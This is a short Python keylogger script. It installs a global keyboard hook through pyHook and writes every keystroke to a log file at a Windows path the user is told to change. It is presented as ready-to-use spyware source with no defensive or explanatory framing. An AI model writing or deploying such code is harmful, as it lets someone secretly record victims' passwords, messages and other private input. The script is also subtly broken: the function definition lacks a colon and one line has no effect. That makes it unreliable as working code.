import pyHook, pythoncom, sys, logging

#Change this!
file_log = "C:\\Users\\User\\Documents\\log.txt"

def OnKeyboardEvent(event)
    logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    chr(event.Ascii)
    logging.log(10,chr(event.Ascii))
    return True

hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()